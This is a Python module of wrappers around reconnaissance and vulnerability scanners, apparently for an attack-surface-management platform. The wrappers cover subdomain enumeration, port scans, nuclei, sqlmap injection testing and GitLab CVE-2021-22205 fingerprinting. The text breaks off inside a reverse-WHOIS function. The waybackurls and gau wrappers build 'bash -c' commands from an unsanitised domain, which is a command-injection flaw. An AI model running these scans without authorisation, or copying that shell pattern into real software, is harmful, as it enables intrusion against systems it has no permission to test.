#!/usr/bin/env python3
"""
ASM Scanner Wrappers

Wrappers around security scanning tools that parse output and feed
into the ASM Bridge for submission to the platform.
"""

import hashlib
import json
import logging
import os
import re
import shutil
import subprocess
import tempfile
import time
from typing import List, Optional, Dict, Any
from urllib.parse import parse_qsl, urljoin, urlparse

from asm_bridge import ASMBridge, Finding

logger = logging.getLogger("asm_scanners")


def _run(cmd: List[str], timeout: int = 600) -> subprocess.CompletedProcess:
    logger.info(f"Running: {' '.join(cmd)}")
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def _tool_available(name: str) -> bool:
    return shutil.which(name) is not None


# =========================================================================
# Subdomain Enumeration
# =========================================================================

def run_subfinder(domain: str, bridge: ASMBridge, timeout: int = 300) -> List[str]:
    """Passive subdomain enumeration via subfinder."""
    if not _tool_available("subfinder"):
        logger.error("subfinder not installed"); return []
    result = _run(["subfinder", "-d", domain, "-silent", "-json"], timeout=timeout)
    subdomains = []
    for line in result.stdout.strip().splitlines():
        try:
            data = json.loads(line)
            host = data.get("host", line.strip())
        except json.JSONDecodeError:
            host = line.strip()
        if host and host != domain:
            subdomains.append(host)
            bridge.submit_subdomain(host, source="subfinder")
    bridge.flush()
    logger.info(f"subfinder: {len(subdomains)} subdomains for {domain}")
    return subdomains


def run_subcat(domain: str, bridge: ASMBridge, timeout: int = 180) -> List[str]:
    """Passive subdomain enumeration via subcat (pip install subcat).

    Aggregates 19 passive sources including dnsdumpster, hackertarget, anubis,
    crt.sh, wayback, virustotal, securitytrails, shodan, and more.
    Free-tier modules work without API keys; paid modules activate when
    ~/.subcat/config.yaml is populated.

    Reference: https://github.com/duty1g/subcat
    """
    if not _tool_available("subcat"):
        logger.error("subcat not installed — run: pip install subcat")
        return []

    result = _run(["subcat", "-d", domain, "-silent"], timeout=timeout)
    subdomains = []
    for line in result.stdout.strip().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # Strip URL scheme if output was collected with extra flags
        for prefix in ("https://", "http://"):
            if line.startswith(prefix):
                line = line[len(prefix):]
                break
        # Strip path/port
        line = line.split("/")[0].split(":")[0].lower()
        if line and "." in line and line != domain:
            subdomains.append(line)
            bridge.submit_subdomain(line, source="subcat")
    bridge.flush()
    logger.info(f"subcat: {len(subdomains)} subdomains for {domain}")
    return subdomains


def run_subfaster(domain: str, bridge: ASMBridge, timeout: int = 180) -> List[str]:
    """Fast passive subdomain enumeration via subfaster.

    Subfinder fork with default keyless sources: thc, submd, crt (crt.name),
    shodanct, rapiddns, hackertarget, sitedossier.

    Reference: https://github.com/melvinsh/subfaster
    """
    if not _tool_available("subfaster"):
        logger.error("subfaster not installed — run: go install github.com/melvinsh/subfaster/v2/cmd/subfaster@latest")
        return []

    result = _run(["subfaster", "-d", domain], timeout=timeout)
    subdomains = []
    for line in result.stdout.strip().splitlines():
        line = line.strip().lower()
        if not line or line.startswith("#"):
            continue
        for prefix in ("https://", "http://"):
            if line.startswith(prefix):
                line = line[len(prefix):]
                break
        line = line.split("/")[0].split(":")[0]
        if line and "." in line and line != domain:
            subdomains.append(line)
            bridge.submit_subdomain(line, source="subfaster")
    bridge.flush()
    logger.info(f"subfaster: {len(subdomains)} subdomains for {domain}")
    return subdomains


def run_amass(domain: str, bridge: ASMBridge, timeout: int = 600) -> List[str]:
    """Subdomain enumeration via amass."""
    if not _tool_available("amass"):
        logger.error("amass not installed"); return []
    result = _run(["amass", "enum", "-passive", "-d", domain, "-json", "-silent"], timeout=timeout)
    subdomains = []
    for line in result.stdout.strip().splitlines():
        try:
            data = json.loads(line)
            host = data.get("name", line.strip())
        except json.JSONDecodeError:
            host = line.strip()
        if host and host != domain:
            subdomains.append(host)
            bridge.submit_subdomain(host, source="amass")
    bridge.flush()
    logger.info(f"amass: {len(subdomains)} subdomains for {domain}")
    return subdomains


# =========================================================================
# DNS Resolution
# =========================================================================

def run_dnsx(hosts: List[str], bridge: ASMBridge, timeout: int = 300) -> Dict[str, str]:
    """Resolve hostnames to IPs via dnsx."""
    if not _tool_available("dnsx"):
        logger.error("dnsx not installed"); return {}
    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
        f.write("\n".join(hosts)); hosts_file = f.name
    try:
        result = _run(["dnsx", "-l", hosts_file, "-a", "-resp", "-silent", "-json"], timeout=timeout)
        resolved = {}
        for line in result.stdout.strip().splitlines():
            try:
                data = json.loads(line)
                host = data.get("host", "")
                ips = data.get("a", [])
                if host and ips:
                    resolved[host] = ips[0]
                    bridge.submit_ip(ips[0], source="dnsx")
            except json.JSONDecodeError:
                continue
        bridge.flush()
        logger.info(f"dnsx: resolved {len(resolved)} hosts")
        return resolved
    finally:
        os.unlink(hosts_file)


# =========================================================================
# Port Scanning
# =========================================================================

def run_naabu(target: str, bridge: ASMBridge, ports: str = "top-1000",
              rate: int = 1000, timeout: int = 600) -> List[dict]:
    """Fast port scanning via naabu."""
    if not _tool_available("naabu"):
        logger.error("naabu not installed"); return []
    cmd = ["naabu", "-host", target, "-json", "-silent", "-rate", str(rate)]
    if ports == "top-1000":
        cmd.extend(["-top-ports", "1000"])
    elif ports == "full":
        cmd.extend(["-p", "-"])
    else:
        cmd.extend(["-p", ports])
    result = _run(cmd, timeout=timeout)
    findings = []
    for line in result.stdout.strip().splitlines():
        try:
            data = json.loads(line)
            host = data.get("host", data.get("ip", target))
            port = data.get("port")
            if port:
                bridge.submit_port(host, port, source="naabu", ip=data.get("ip"))
                findings.append({"host": host, "port": port, "ip": data.get("ip")})
        except json.JSONDecodeError:
            continue
    bridge.flush()
    logger.info(f"naabu: {len(findings)} open ports on {target}")
    return findings


def run_nmap(target: str, bridge: ASMBridge, ports: str = "1-1000",
             args: str = "-sV -sC", timeout: int = 900) -> List[dict]:
    """Service detection and scripting via nmap."""
    if not _tool_available("nmap"):
        logger.error("nmap not installed"); return []
    cmd = ["nmap"] + args.split() + ["-p", ports, "-oX", "-", target]
    result = _run(cmd, timeout=timeout)
    findings = []
    # Parse XML output for port/service info
    import xml.etree.ElementTree as ET
    try:
        root = ET.fromstring(result.stdout)
        for host_el in root.findall(".//host"):
            ip_el = host_el.find("address[@addrtype='ipv4']")
            ip = ip_el.get("addr") if ip_el is not None else target
            for port_el in host_el.findall(".//port"):
                port_num = int(port_el.get("portid", 0))
                protocol = port_el.get("protocol", "tcp")
                state_el = port_el.find("state")
                state = state_el.get("state", "unknown") if state_el is not None else "unknown"
                service_el = port_el.find("service")
                svc_name = service_el.get("name") if service_el is not None else None
                svc_product = service_el.get("product") if service_el is not None else None
                svc_version = service_el.get("version") if service_el is not None else None
                if state == "open":
                    bridge.submit_port(target, port_num, protocol, source="nmap",
                                       service=svc_name, ip=ip,
                                       service_product=svc_product,
                                       service_version=svc_version)
                    findings.append({"host": target, "port": port_num, "service": svc_name,
                                     "product": svc_product, "version": svc_version})
    except ET.ParseError:
        logger.warning("Failed to parse nmap XML output")
    bridge.flush()
    logger.info(f"nmap: {len(findings)} services on {target}")
    return findings


def run_masscan(target: str, bridge: ASMBridge, ports: str = "1-65535",
                rate: int = 1000, timeout: int = 600) -> List[dict]:
    """Ultra-fast port scanning via masscan."""
    if not _tool_available("masscan"):
        logger.error("masscan not installed"); return []
    cmd = ["masscan", target, "-p", ports, "--rate", str(rate), "-oJ", "-"]
    result = _run(cmd, timeout=timeout)
    findings = []
    for line in result.stdout.strip().splitlines():
        line = line.strip().rstrip(",")
        if not line.startswith("{"):
            continue
        try:
            data = json.loads(line)
            ip = data.get("ip", target)
            for port_info in data.get("ports", []):
                port = port_info.get("port")
                proto = port_info.get("proto", "tcp")
                if port:
                    bridge.submit_port(ip, port, proto, source="masscan", ip=ip)
                    findings.append({"ip": ip, "port": port, "proto": proto})
        except json.JSONDecodeError:
            continue
    bridge.flush()
    logger.info(f"masscan: {len(findings)} open ports on {target}")
    return findings


# =========================================================================
# Vulnerability Scanning
# =========================================================================

def run_nuclei(target: str, bridge: ASMBridge, templates: Optional[str] = None,
               severity: str = "low,medium,high,critical", rate_limit: int = 150,
               timeout: int = 900) -> List[dict]:
    """Vulnerability scanning via nuclei."""
    if not _tool_available("nuclei"):
        logger.error("nuclei not installed"); return []
    cmd = ["nuclei", "-target", target, "-json", "-silent",
           "-severity", severity, "-rate-limit", str(rate_limit)]
    if templates:
        cmd.extend(["-t", templates])
    result = _run(cmd, timeout=timeout)
    findings = []
    for line in result.stdout.strip().splitlines():
        try:
            data = json.loads(line)
            info = data.get("info", {})
            classification = info.get("classification", {})
            cve_id = classification.get("cve-id")
            if isinstance(cve_id, list) and cve_id:
                cve_id = cve_id[0]
            bridge.submit_vulnerability(
                host=data.get("host", target),
                title=info.get("name", data.get("template-id", "Unknown")),
                severity=info.get("severity", "info"),
                source="nuclei",
                template_id=data.get("template-id"),
                cve_id=cve_id if isinstance(cve_id, str) else None,
                url=data.get("matched-at"),
                description=info.get("description"),
                tags=info.get("tags", []),
                references=info.get("reference", []),
                raw_data=data,
            )
            findings.append(data)
        except json.JSONDecodeError:
            continue
    bridge.flush()
    logger.info(f"nuclei: {len(findings)} vulnerabilities on {target}")
    return findings


def run_nikto(target: str, bridge: ASMBridge, timeout: int = 600) -> List[dict]:
    """Web server vulnerability scanning via nikto."""
    if not _tool_available("nikto"):
        logger.error("nikto not installed"); return []
    cmd = ["nikto", "-h", target, "-Format", "json", "-output", "-"]
    result = _run(cmd, timeout=timeout)
    findings = []
    try:
        data = json.loads(result.stdout)
        for vuln in data.get("vulnerabilities", []):
            bridge.submit_vulnerability(
                host=target, title=vuln.get("msg", "Nikto Finding"),
                severity="medium", source="nikto",
                url=vuln.get("url"), description=vuln.get("msg"),
            )
            findings.append(vuln)
    except json.JSONDecodeError:
        for line in result.stdout.strip().splitlines():
            if "+ " in line:
                bridge.submit_vulnerability(
                    host=target, title=line.strip("+ ").strip(),
                    severity="info", source="nikto",
                )
                findings.append({"msg": line})
    bridge.flush()
    logger.info(f"nikto: {len(findings)} findings on {target}")
    return findings


def run_sqlmap(
    target_url: str,
    bridge: ASMBridge,
    timeout: int = 600,
    data: str = "",
    param: str = "",
    cookie: str = "",
    method: str = "",
    level: int = 3,
    risk: int = 2,
) -> List[dict]:
    """SQL injection testing via sqlmap with structured finding output.

    Prefer calling after probe_sqli_params flags a candidate. Supports POST body,
    specific -p params, and cookies. Safe flags only (--batch, no os-shell).
    """
    if not _tool_available("sqlmap"):
        logger.error("sqlmap not installed")
        return []

    level = max(1, min(int(level or 3), 5))
    risk = max(1, min(int(risk or 2), 3))
    out_dir = tempfile.mkdtemp(prefix="sqlmap_")
    cmd = [
        "sqlmap", "-u", target_url,
        "--batch",
        f"--level={level}",
        f"--risk={risk}",
        f"--output-dir={out_dir}",
        "--forms",
        "--smart",
        "--technique=BEUSTQ",
        "--threads=2",
    ]
    if data:
        cmd += ["--data", data]
    if param:
        cmd += ["-p", param]
    if cookie:
        cmd += ["--cookie", cookie]
    if method:
        cmd += ["--method", method.upper()]

    try:
        result = _run(cmd, timeout=timeout)
    except subprocess.TimeoutExpired:
        logger.warning("sqlmap timed out on %s", target_url)
        return []

    output = (result.stdout or "") + "\n" + (result.stderr or "")
    findings: List[dict] = []

    # Parse "Parameter: <name> ..." / "is vulnerable" blocks
    injectable_params = re.findall(
        r"Parameter:\s*([^\s\(]+).*?(?:is vulnerable|injectable)",
        output,
        flags=re.I | re.S,
    )
    # Also catch "GET parameter 'id' is vulnerable"
    injectable_params += re.findall(
        r"(?:GET|POST|Cookie|Header)\s+parameter\s+'([^']+)'\s+is\s+vulnerable",
        output,
        flags=re.I,
    )
    techniques = re.findall(
        r"Type:\s*([^\n]+)|Technique:\s*([^\n]+)",
        output,
        flags=re.I,
    )
    tech_notes = ", ".join(
        (a or b).strip() for a, b in techniques if (a or b)
    )[:500]

    unique_params = sorted({p.strip() for p in injectable_params if p.strip()})
    host = urlparse(target_url).hostname or target_url

    if unique_params or re.search(r"\bis vulnerable\b|\binjectable\b", output, re.I):
        if not unique_params:
            unique_params = [param] if param else ["(detected)"]
        for p_name in unique_params:
            title = f"SQL Injection in parameter '{p_name}'"
            desc = (
                f"sqlmap confirmed injectable parameter '{p_name}' on {target_url}. "
                f"Techniques: {tech_notes or 'see sqlmap output'}."
            )
            bridge.submit_vulnerability(
                host=host,
                title=title,
                severity="critical",
                source="sqlmap",
                description=desc + "\n\n" + output[-1500:],
                url=target_url,
                confidence="confirmed",
                tags=["sqli", "injection", "sqlmap", "confirmed"],
            )
            findings.append({
                "title": title,
                "name": title,
                "url": target_url,
                "matched_at": target_url,
                "parameter": p_name,
                "severity": "critical",
                "vuln_type": "sqli",
                "type": "sqli",
                "vulnerable": True,
                "confirmed": True,
                "source": "sqlmap",
                "evidence": tech_notes or output[-800:],
            })
        bridge.flush()

    logger.info("sqlmap: %d injection points on %s", len(findings), target_url)
    return findings


# =========================================================================
# Web Application Scanning
# =========================================================================

def run_httpx(hosts: List[str], bridge: ASMBridge, timeout: int = 300) -> List[dict]:
    """HTTP probing and technology detection via httpx."""
    if not _tool_available("httpx"):
        logger.error("httpx not installed"); return []
    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
        f.write("\n".join(hosts)); hosts_file = f.name
    try:
        cmd = ["httpx", "-l", hosts_file, "-silent", "-json",
               "-title", "-tech-detect", "-status-code"]
        result = _run(cmd, timeout=timeout)
        live_hosts = []
        for line in result.stdout.strip().splitlines():
            try:
                data = json.loads(line)
                url = data.get("url", "")
                if url:
                    techs = data.get("tech", [])
                    bridge.submit_url(url, source="httpx", technologies=techs)
                    live_hosts.append(data)
            except json.JSONDecodeError:
                continue
        bridge.flush()
        logger.info(f"httpx: {len(live_hosts)} live hosts")
        return live_hosts
    finally:
        os.unlink(hosts_file)


def run_whatweb(target: str, bridge: ASMBridge, timeout: int = 300) -> List[dict]:
    """Technology fingerprinting via WhatWeb."""
    if not _tool_available("whatweb"):
        logger.error("whatweb not installed"); return []
    cmd = ["whatweb", target, "--log-json=-", "-q"]
    result = _run(cmd, timeout=timeout)
    findings = []
    for line in result.stdout.strip().splitlines():
        try:
            data = json.loads(line)
            plugins = data.get("plugins", {})
            techs = [k for k in plugins.keys() if k not in ("HttpOnly", "IP", "Country")]
            bridge.submit_url(data.get("target", target), source="whatweb", technologies=techs)
            findings.append(data)
        except json.JSONDecodeError:
            continue
    bridge.flush()
    logger.info(f"whatweb: {len(findings)} results for {target}")
    return findings


def run_wafw00f(target: str, bridge: ASMBridge, timeout: int = 120) -> Optional[str]:
    """WAF detection via wafw00f."""
    if not _tool_available("wafw00f"):
        logger.error("wafw00f not installed"); return None
    cmd = ["wafw00f", target, "-o", "-"]
    result = _run(cmd, timeout=timeout)
    waf = None
    output = result.stdout
    if "is behind" in output:
        for line in output.splitlines():
            if "is behind" in line:
                waf = line.split("is behind")[-1].strip().rstrip(".")
                bridge.submit_finding(Finding(
                    type="technology", source="wafw00f", target=target,
                    host=target, title=f"WAF Detected: {waf}",
                    technologies=[waf], severity="info",
                ))
    bridge.flush()
    logger.info(f"wafw00f: {'WAF=' + waf if waf else 'No WAF'} on {target}")
    return waf


_KNOWN_GITLAB_ASSET_HASHES: Dict[str, Dict[str, Any]] = {
    # Seen in public reporting as useful for GitLab CE version correlation.
    # Keep version empty unless a local hash DB confirms the exact release.
    "4a081f9e3a60a0e580cad484d66fbf5a1505ad313280e96728729069f87f856e": {
        "product": "GitLab CE",
        "notes": "Known GitLab /help stylesheet hash; provide GITLAB_HASH_DB_PATH for exact version mapping.",
        "cve_candidates": ["CVE-2021-22205"],
    },
}


def _load_gitlab_hash_db(db_path: str = "") -> Dict[str, Dict[str, Any]]:
    path = db_path or os.environ.get("GITLAB_HASH_DB_PATH", "")
    db = dict(_KNOWN_GITLAB_ASSET_HASHES)
    if not path:
        return db
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
    except Exception as e:
        logger.warning(f"failed to load GitLab hash DB {path}: {e}")
        return db

    if isinstance(data, dict):
        for asset_hash, record in data.items():
            if isinstance(record, str):
                db[asset_hash.lower()] = {"version": record}
            elif isinstance(record, dict):
                db[asset_hash.lower()] = record
    elif isinstance(data, list):
        for item in data:
            if not isinstance(item, dict):
                continue
            asset_hash = str(item.get("hash") or item.get("sha256") or "").lower()
            if asset_hash:
                db[asset_hash] = item
    return db


def _parse_version_tuple(version: str) -> tuple:
    match = re.search(r"(\d+)\.(\d+)\.(\d+)", version or "")
    if not match:
        return ()
    return tuple(int(part) for part in match.groups())


def _gitlab_cve_2021_22205_risk(version: str) -> str:
    """Return vulnerable/patched/unknown for GitLab CVE-2021-22205 by version."""
    v = _parse_version_tuple(version)
    if not v:
        return "unknown"
    major, minor, patch = v
    if major < 11 or (major == 11 and minor < 9):
        return "unknown"
    if major < 13:
        return "vulnerable"
    if major > 13:
        return "patched"
    if minor < 8:
        return "vulnerable"
    if minor == 8:
        return "patched" if patch >= 8 else "vulnerable"
    if minor == 9:
        return "patched" if patch >= 6 else "vulnerable"
    if minor == 10:
        return "patched" if patch >= 3 else "vulnerable"
    return "patched"


def run_gitlab_fingerprint(
    target_url: str,
    bridge: ASMBridge,
    hash_db_path: str = "",
    timeout: int = 30,
    max_assets: int = 20,
) -> Dict[str, Any]:
    """Fingerprint GitLab by hashing /help stylesheet assets.

    This mirrors the Praetorian-style blackbox technique without exploitation:
    collect stylesheet URLs from /help, compute SHA-256 hashes, and correlate
    them against a local hash database when available.
    """
    import httpx

    base = target_url.rstrip("/")
    parsed = urlparse(base)
    if not parsed.scheme:
        base = f"https://{base}"
        parsed = urlparse(base)
    help_url = urljoin(base + "/", "help")
    hash_db = _load_gitlab_hash_db(hash_db_path)
    assets: List[Dict[str, Any]] = []
    matches: List[Dict[str, Any]] = []
    is_gitlab = False

    try:
        with httpx.Client(
            timeout=timeout,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "AegisVanguard-GitLab-Fingerprint/1.0"},
        ) as client:
            response = client.get(help_url)
            body = response.text or ""
            headers = response.headers or {}
            is_gitlab = (
                "gitlab" in body[:20000].lower()
                or "gitlab" in str(headers).lower()
                or "/assets/application-" in body
            )
            stylesheet_paths = re.findall(
                r"""<link[^>]+href=["']([^"']+\.css(?:\?[^"']*)?)["']""",
                body,
                flags=re.I,
            )
            for href in stylesheet_paths[: max(1, min(int(max_assets or 20), 50))]:
                asset_url = urljoin(help_url, href)
                try:
                    asset_response = client.get(asset_url)
                    content = asset_response.content or b""
                except Exception as e:
                    assets.append({"url": asset_url, "ok": False, "error": str(e)})
                    continue
                sha256 = hashlib.sha256(content).hexdigest()
                asset = {
                    "url": asset_url,
                    "ok": asset_response.status_code < 400,
                    "status_code": asset_response.status_code,
                    "sha256": sha256,
                    "bytes": len(content),
                }
                record = hash_db.get(sha256)
                if record:
                    asset["hash_db_match"] = record
                    version = str(record.get("version") or "")
                    risk = _gitlab_cve_2021_22205_risk(version)
                    match = {
                        "asset_url": asset_url,
                        "sha256": sha256,
                        "version": version or None,
                        "record": record,
                        "cve_2021_22205_risk": risk,
                    }
                    matches.append(match)
                assets.append(asset)
    except Exception as e:
        return {
            "success": False,
            "target_url": target_url,
            "help_url": help_url,
            "error": str(e),
        }

    versions = sorted({m["version"] for m in matches if m.get("version")})
    risk = "unknown"
    if any(m.get("cve_2021_22205_risk") == "vulnerable" for m in matches):
        risk = "vulnerable"
    elif matches and all(m.get("cve_2021_22205_risk") == "patched" for m in matches if m.get("version")):
        risk = "patched"

    host = parsed.hostname or target_url
    result = {
        "success": True,
        "target_url": target_url,
        "help_url": help_url,
        "is_probable_gitlab": is_gitlab or bool(matches),
        "versions": versions,
        "asset_count": len(assets),
        "matches": matches,
        "assets": assets,
        "cve_2021_22205_risk": risk,
    }

    if result["is_probable_gitlab"]:
        bridge.submit_finding(Finding(
            type="technology",
            source="gitlab-fingerprint",
            target=host,
            host=host,
            url=help_url,
            title=f"GitLab fingerprinted: {host}",
            severity="info" if risk != "vulnerable" else "high",
            confidence="high" if matches else "medium",
            technologies=["GitLab"],
            tags=["gitlab", "asset-hash", f"cve-2021-22205:{risk}"],
            raw_data=result,
        ))
        if risk == "vulnerable":
            bridge.submit_vulnerability(
                host=host,
                title="GitLab version potentially vulnerable to CVE-2021-22205",
                severity="critical",
                source="gitlab-fingerprint",
                url=help_url,
                description=(
                    "GitLab stylesheet hash correlation mapped this instance to a "
                    "version in the vulnerable CVE-2021-22205 range. This is a "
                    "non-destructive fingerprint; exploit validation requires "
                    "explicit authorization and an approved OOB collaborator."
                ),
                confidence="medium",
                cve_id="CVE-2021-22205",
                tags=["gitlab", "cve-2021-22205", "fingerprint"],
                raw_data=result,
            )
    bridge.flush()
    logger.info(
        "gitlab fingerprint: probable=%s matches=%d risk=%s target=%s",
        result["is_probable_gitlab"], len(matches), risk, target_url,
    )
    return result


# =========================================================================
# SSL/TLS Testing
# =========================================================================

def run_testssl(target: str, bridge: ASMBridge, timeout: int = 600) -> List[dict]:
    """SSL/TLS testing via testssl.sh."""
    if not _tool_available("testssl") and not _tool_available("testssl.sh"):
        logger.error("testssl not installed"); return []
    binary = "testssl.sh" if _tool_available("testssl.sh") else "testssl"
    cmd = [binary, "--json", "-", target]
    result = _run(cmd, timeout=timeout)
    findings = []
    try:
        data = json.loads(result.stdout)
        for item in data if isinstance(data, list) else data.get("scanResult", []):
            sev = item.get("severity", "INFO").lower()
            if sev in ("critical", "high", "medium", "warn"):
                bridge.submit_vulnerability(
                    host=target, title=item.get("id", "SSL Issue"),
                    severity="medium" if sev == "warn" else sev,
                    source="testssl", description=item.get("finding", ""),
                )
                findings.append(item)
    except json.JSONDecodeError:
        pass
    bridge.flush()
    logger.info(f"testssl: {len(findings)} issues on {target}")
    return findings


def run_sslyze(target: str, bridge: ASMBridge, timeout: int = 300) -> List[dict]:
    """SSL/TLS analysis via sslyze."""
    if not _tool_available("sslyze"):
        logger.error("sslyze not installed"); return []
    cmd = ["sslyze", "--json_out=-", target]
    result = _run(cmd, timeout=timeout)
    findings = []
    try:
        data = json.loads(result.stdout)
        for server in data.get("server_scan_results", []):
            scan = server.get("scan_result", {})
            cert_info = scan.get("certificate_info", {})
            if cert_info.get("result", {}).get("certificate_deployments"):
                for dep in cert_info["result"]["certificate_deployments"]:
                    if not dep.get("leaf_certificate_subject_matches_hostname", True):
                        bridge.submit_vulnerability(
                            host=target, title="SSL Certificate Hostname Mismatch",
                            severity="medium", source="sslyze",
                        )
                        findings.append({"type": "cert_mismatch"})
    except json.JSONDecodeError:
        pass
    bridge.flush()
    logger.info(f"sslyze: {len(findings)} issues on {target}")
    return findings


# =========================================================================
# Web Crawling & URL Discovery
# =========================================================================

# Aligns with ProjectDiscovery README: -d 5 -jc -fx -ef woff,css,...
_KATANA_EF_PIPELINE = "woff,css,png,svg,jpg,woff2,jpeg,gif"


def run_katana(target: str, bridge: ASMBridge, depth: int = 5,
               timeout: int = 600) -> List[str]:
    """Web crawling via katana (JS crawl, form extraction, extension noise filter)."""
    if not _tool_available("katana"):
        logger.error("katana not installed"); return []
    cmd = [
        "katana", "-u", target,
        "-silent", "-json", "-nc",
        "-d", str(depth),
        "-jc", "-fx",
        "-ef", _KATANA_EF_PIPELINE,
    ]
    result = _run(cmd, timeout=timeout)
    urls = []
    for line in result.stdout.strip().splitlines():
        try:
            data = json.loads(line)
            url = data.get("request", {}).get("endpoint", line.strip())
        except json.JSONDecodeError:
            url = line.strip()
        if url and url.startswith("http"):
            urls.append(url)
            bridge.submit_url(url, source="katana")
    bridge.flush()
    logger.info(f"katana: {len(urls)} URLs on {target}")
    return urls


def run_waybackurls(domain: str, bridge: ASMBridge, timeout: int = 300) -> List[str]:
    """Historical URL discovery via waybackurls."""
    if not _tool_available("waybackurls"):
        logger.error("waybackurls not installed"); return []
    result = _run(["bash", "-c", f"echo {domain} | waybackurls"], timeout=timeout)
    urls = [u.strip() for u in result.stdout.strip().splitlines() if u.strip().startswith("http")]
    for url in urls:
        bridge.submit_url(url, source="waybackurls")
    bridge.flush()
    logger.info(f"waybackurls: {len(urls)} URLs for {domain}")
    return urls


def run_gau(domain: str, bridge: ASMBridge, timeout: int = 300) -> List[str]:
    """URL discovery via gau (GetAllURLs)."""
    if not _tool_available("gau"):
        logger.error("gau not installed"); return []
    result = _run(["bash", "-c", f"echo {domain} | gau --subs"], timeout=timeout)
    urls = [u.strip() for u in result.stdout.strip().splitlines() if u.strip().startswith("http")]
    for url in urls:
        bridge.submit_url(url, source="gau")
    bridge.flush()
    logger.info(f"gau: {len(urls)} URLs for {domain}")
    return urls


# =========================================================================
# Directory & API Fuzzing
# =========================================================================

def run_ffuf(target_url: str, bridge: ASMBridge, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
             timeout: int = 600) -> List[dict]:
    """Directory/API fuzzing via ffuf."""
    if not _tool_available("ffuf"):
        logger.error("ffuf not installed"); return []
    fuzz_url = target_url.rstrip("/") + "/FUZZ"
    cmd = ["ffuf", "-u", fuzz_url, "-w", wordlist, "-o", "-", "-of", "json",
           "-mc", "200,201,301,302,403", "-s"]
    result = _run(cmd, timeout=timeout)
    findings = []
    try:
        data = json.loads(result.stdout)
        for r in data.get("results", []):
            url = r.get("url", "")
            bridge.submit_url(url, source="ffuf")
            findings.append(r)
    except json.JSONDecodeError:
        pass
    bridge.flush()
    logger.info(f"ffuf: {len(findings)} paths on {target_url}")
    return findings


def run_arjun(target_url: str, bridge: ASMBridge, timeout: int = 300) -> List[str]:
    """HTTP parameter discovery via arjun."""
    if not _tool_available("arjun"):
        logger.error("arjun not installed"); return []
    cmd = ["arjun", "-u", target_url, "--stable", "-oJ", "-"]
    result = _run(cmd, timeout=timeout)
    params = []
    try:
        data = json.loads(result.stdout)
        for url, p_list in data.items():
            params.extend(p_list)
            bridge.submit_url(url, source="arjun",
                              raw_data={"parameters": p_list})
    except json.JSONDecodeError:
        pass
    bridge.flush()
    logger.info(f"arjun: {len(params)} parameters on {target_url}")
    return params


# =========================================================================
# Secret & Code Scanning
# =========================================================================

def _parse_csv_lines(value: str, max_items: Optional[int] = None) -> List[str]:
    items: List[str] = []
    for line in str(value or "").replace(",", "\n").splitlines():
        item = line.strip()
        if item and item not in items:
            items.append(item)
            if max_items and len(items) >= max_items:
                break
    return items


def _extract_reverse_whois_domains(payload: Dict[str, Any]) -> List[str]:
    """Handle common WhoisXML reverse WHOIS response shapes defensively."""
    domains: List[str] = []
    candidates = [
        payload.get("domainsList"),
        payload.get("domains"),
        payload.get("domainNames"),
        payload.get("records"),
    ]
    for candidate in candidates:
        if not isinstance(candidate, list):
            continue
        for item in candidate:
            if isinstance(item, str):
                domains.append(item.strip())
            elif isinstance(item, dict):
                for key in ("domainName", "domain", "name"):
                    val = item.get(key)
                    if isinstance(val, str):
                        domains.append(val.strip())
                        break
    out: List[str] = []
    seen = set()
    for domain in domains:
        domain = domain.lower().rstrip(".")
        if domain and domain not in seen:
            seen.add(domain)
            out.append(domain)
    return out


def run_reverse_whois_search(
    terms: str,
    bridge: ASMBridge,
    api_key: str = "",
    search_type: str = "current",
    mode: str = "preview",
    exclude: str = "",
    max_terms: int = 10,
    max_domains: int = 500,
    timeout: int = 60,
) -> Dict[str, Any]:
    """Reverse WHOIS pivot via WhoisXML API.

    Searches WHOIS records for brand names, organization names, emails, known
    domains, or other unique strings. Defaults to preview mode to avoid
    unexpected paid domain-list retrieval.
    """
    key = (
        api_key
        or os.environ.get("WHOISXML_API_KEY", "")
        or os.environ.get("WHOISXML_API", "")
    )
    if not key:
        return {
            "success": False,
            "error": "WHOISXML_API_KEY or WHOISXML_API is required",
            "terms": [],
            "results": [],
        }

    normalized_mode = (mode or "preview").lower().strip()
    if normalized_mode not in ("preview", "purchase"):
        normalized_mode = "preview"

    normalized_search_type = (search_type or "current").lower().strip()
    if normalized_search_type not in ("current", "historic"):
        normalized_search_type = "current"

    include_terms = _parse_csv_lines(terms, max_items=max(1, min(int(max_terms or 10), 50)))
    exclude_terms = _parse_csv_lines(exclude, max_items=4)
    if not include_terms:
        return {"success": False, "error": "No search terms supplied", "results": []}

    endpoint = "https://reverse-whois.whoisxmlapi.com/api/v2"
    results: List[Dict[str, Any]] = []
    discovered_domains: List[str] = []

    import httpx

    with httpx.Client(timeout=timeout) as client:
        for term in include_terms:
            request_body = {
                "apiKey": key,
                "basicSearchTerms": {
                    "include": [term],
                    "exclude": exclude_terms,
                },
                "searchType": normalized_search_type,
                "mode": normalized_mode,
                "punycode": True,
            }
            try:
                response = client.post(
                    endpoint,
                    json=request_body,
                    headers={"Content-Type": "application/json"},
                )
            except Exception as e:
                results.append({"term": term, "ok": False, "error": str(e)})
                continue

            if response.status_code >= 400:
                results.append({
                    "term": term,
                    "ok": False,
                    "status_code": response.status_code,
                    "error": response.text[:500],
                })
                continue

            try:
                payload = response.json()
            except ValueError:
                results.append({"term": term, "ok": False, "error": "Non-JSON response"})
                continue

            domains = _extract_reverse_whois_domains(payload)[:max_domains]
            count = (
                payload.get("domainsCount")
                or payload.get("count")
                or payload.get("total")
                or len(domains)
            )
            result = {
                "term": term,
                "ok": True,
                "mode": normalized_mode,
                "search_type": normalized_search_type,
                "domains_count": count,
                "domains": domains,
            }
            results.append(result)
            discovered_domains.extend(domains)

            if normalized_mode == "preview":
                bridge.submit_finding(Finding(
                    type="osint",
                    source="reverse-whois",
                    target=term,
                    title=f"Reverse WHOIS preview: {term}",
                    severity="info",
                    confidence="medium",
                    description=f"WhoisXML reverse WHOIS preview returned {count} matching domain(s).",
                    tags=["osint", "reverse-whois", normalized_search_type, "preview"],
                    raw_data={k: v for k, v in result.items() if k != "domains"},
                ))
            else:
                for domain in domains:
                    bridge.submit_domain(domain, source="reverse-whois", raw_data={"search_term": term})

